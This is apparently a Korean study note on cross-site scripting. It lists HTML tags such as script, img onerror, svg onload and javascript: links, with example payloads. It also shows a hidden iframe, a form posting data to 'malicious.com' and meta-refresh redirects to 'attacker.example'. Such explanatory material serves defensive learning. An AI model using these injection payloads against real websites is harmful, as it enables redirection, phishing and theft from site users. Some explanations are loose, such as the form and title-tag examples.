### XSS 공격에 자주 사용되는 HTML 태그들

XSS 공격에서 사용되는 다양한 HTML 태그와 그들의 특성에 대해 정리한 표입니다. 각 태그는 보통 **이벤트 핸들러** 등과 결합되어 **악성 스크립트**를 삽입하는 데 사용됩니다.

---

| **태그**         | **설명**                                                                              | **예시**                                                                                                                          |
| -------------- | ----------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| **`<iframe>`** | 다른 HTML 문서를 현재 페이지 내에 삽입하는 태그. 주로 **타겟 페이지**를 다른 웹 페이지로 삽입할 때 사용.                   | `<iframe src="http://malicious.com" style="display:none;"></iframe>`                                                            |
| **`<img>`**    | 이미지 파일을 표시하는 태그로, **`onerror`** 이벤트를 활용한 XSS 공격에 자주 사용. 이미지 로드 실패 시 악성 스크립트를 실행 가능. | `<img src="x" onerror="alert('XSS Attack')">`                                                                                   |
| **`<script>`** | 자바스크립트 코드를 삽입하는 태그로, XSS의 기본적인 공격 방식.                                               | `<script>alert('XSS Attack')</script>`                                                                                          |
| **`<a>`**      | 하이퍼링크를 정의하는 태그로, **`javascript:`** 프로토콜을 통해 자바스크립트 코드를 실행 가능.                       | `<a href="javascript:alert('XSS')">Click here</a>`                                                                              |
| **`<body>`**   | HTML 문서의 본문을 정의하는 태그로, **`onload`** 이벤트와 결합하여 페이지 로드 시 스크립트를 실행 가능.                 | `<body onload="alert('XSS')">`                                                                                                  |
| **`<svg>`**    | Scalable Vector Graphics 태그로, `<script>`가 차단된 환경에서 XSS를 우회하는 데 사용 가능.               | `<svg onload="alert('XSS')"></svg>`                                                                                             |
| **`<div>`**    | 일반적인 컨테이너 요소로, **`onmouseover`** 이벤트를 통해 마우스를 올릴 때 스크립트 실행 가능.                      | `<div onmouseover="alert('XSS')">Hover me</div>`                                                                                |
| **`<form>`**   | HTML 폼을 정의하는 태그로, 폼 제출 시 악성 스크립트를 포함한 데이터를 서버로 보내는 데 사용 가능.                         | `<form action="http://malicious.com" method="POST"><input type="text" name="data"><button type="submit">Submit</button></form>` |

---

### 1. **`<iframe>`**

* **설명**: 다른 HTML 문서를 현재 페이지 내에 삽입하는 태그입니다. 이를 통해 악성 사이트를 임베딩하거나, 피싱 공격을 수행하는 데 사용될 수 있습니다.
* **`sandbox` 속성**: `<iframe>` 요소에 추가할 수 있는 속성으로, 콘텐츠의 실행 환경을 제한합니다. 예를 들어, `sandbox="allow-scripts"`는 스크립트 실행을 허용하지만, 폼 제출이나 창을 여는 것을 제한할 수 있습니다.

**예시**:

```html
<iframe src="http://malicious.com" style="display:none;"></iframe>
```

### 2. **`<img>`**

* **설명**: 이미지 태그는 XSS 공격에서 자주 사용됩니다. 특히 **`onerror`** 이벤트를 이용해 이미지가 로드되지 않을 때 스크립트를 실행할 수 있습니다.
* **`onerror`**: 이미지가 로드되지 않았을 때 호출되는 이벤트입니다. 이를 악용하여 이미지 로드 실패 시 자바스크립트 코드를 실행할 수 있습니다.

**예시**:

```html
<img src="x" onerror="alert('XSS Attack')">
```

### 3. **`<script>`**

* **설명**: XSS 공격의 핵심적인 요소입니다. `<script>` 태그 안에 악성 JavaScript 코드를 삽입하여 공격을 수행합니다.
* **기타 이벤트**: `onload`, `onclick`, `onmouseover` 등의 이벤트 핸들러와 결합하여 동적으로 공격을 유도할 수 있습니다.

**예시**:

```html
<script>alert('XSS Attack')</script>
```

### 4. **`<a>`**

* **설명**: 하이퍼링크를 정의하는 `<a>` 태그는 자주 **`javascript:`** 프로토콜을 이용한 XSS 공격에 사용됩니다. 클릭 시 자바스크립트 코드를 실행할 수 있습니다.

**예시**:

```html
<a href="javascript:alert('XSS')">Click here</a>
```

### 5. **`<body>`**

* **설명**: 페이지가 로드될 때 자동으로 스크립트를 실행하는 데 사용됩니다. `onload` 이벤트를 사용하여 페이지가 로드되면 스크립트가 실행되도록 할 수 있습니다.

**예시**:

```html
<body onload="alert('XSS')">
```

### 6. **`<svg>`**

* **설명**: `<svg>`는 이미지 파일을 처리할 수 있는 XML 기반의 그래픽 태그입니다. `<script>` 태그가 차단된 환경에서 우회 공격을 할 수 있습니다.
* **`onload`** 이벤트를 사용하여 스크립트를 삽입할 수 있습니다.

**예시**:

```html
<svg onload="alert('XSS')"></svg>
```

### 7. **`<div>`**

* **설명**: `<div>`는 블록 레벨 컨테이너로 주로 레이아웃을 구성하는 데 사용되지만, 이벤트 핸들러를 이용해 XSS 공격을 할 수 있습니다. 예를 들어, **`onmouseover`** 이벤트를 사용하여 사용자가 마우스를 올리면 스크립트가 실행됩니다.

**예시**:

```html
<div onmouseover="alert('XSS')">Hover me</div>
```

### 8. **`<form>`**

* **설명**: 폼을 사용하여 악성 데이터를 서버로 전송하거나, 특정 사이트로 리다이렉션할 수 있습니다. 특히 **`action`** 속성을 악용하여 데이터를 제출하거나 XSS 공격을 유발할 수 있습니다.

**예시**:

```html
<form action="http://malicious.com" method="POST">
  <input type="text" name="data">
  <button type="submit">Submit</button>
</form>
```

---

### 그 외 추가

### 1. **`<meta>`refresh XSS**
meta 태그 삽입이 실제로 작동하는 조건은 다음과 같다. 

* **삽입 위치(문맥)**: `<head>` 내부에 들어가야 안정적으로 동작. `<body>`에 삽입됐을 때도 일부 브라우저는 처리할 수 있으나 동작 보장은 없음.
* **출력 이스케이프 여부**: 서버가 입력을 HTML 이스케이프(`&lt;`, `&gt;`) 하지 않으면 실행 가능.
* **컨텐츠 보안 정책(CSP)**: 강력한 CSP가 있으면 리디렉션/인라인 실행을 차단할 수 있음(다만 meta refresh는 CSP로 완벽히 막히지 않을 수 있음 — CSP는 주로 스크립트/리소스 제어).


1. 기본적인 메타 리디렉션 삽입(비실행, 이스케이프 처리)

```html
<!-- 실제로는 &lt; ?php ... 처럼 이스케이프하여 실행을 방지 -->
&lt;meta http-equiv="refresh" content="0;url=https://attacker.example/" /&gt;
```

* 설명: 만약 웹앱이 사용자 입력을 아무 이스케이프 없이 `<head>` 안에 출력한다면 위와 같은 태그로 사용자를 즉시 다른 URL로 보낼 수 있다.

2. HTML 속성 문맥에서의 삽입(비실행)

```html
<!-- 취약한 템플릿: <title>USER_INPUT</title> -->
<title>&lt;meta http-equiv="refresh" content="0;url=https://attacker.example/" /&gt;</title>
```

* 설명: `<head>`의 `<title>` 등 적절히 필터링하지 않으면 브라우저가 `<meta>`를 무시하거나 처리하는 브라우저별 차이가 있지만, 일부 환경에서는 태그로 해석될 수 있다.

3. 스크립트 우회와 메타 결합(비실행 표기)

```html
<!-- 예: 입력값이 자바스크립트 문자열 안에 들어간 경우 -->
<script>var s = '&lt;meta http-equiv="refresh" content="0;url=https://attacker.example/" /&gt;';</script>
```

* 설명: 자바스크립트 문자열 내부에 들어가면 그대로 문자열로 남아 실행 안 될 수 있지만, 공격자는 문자열 종료 등으로 탈출하여 실행을 시도할 수 있다(문맥에 따라 다름).


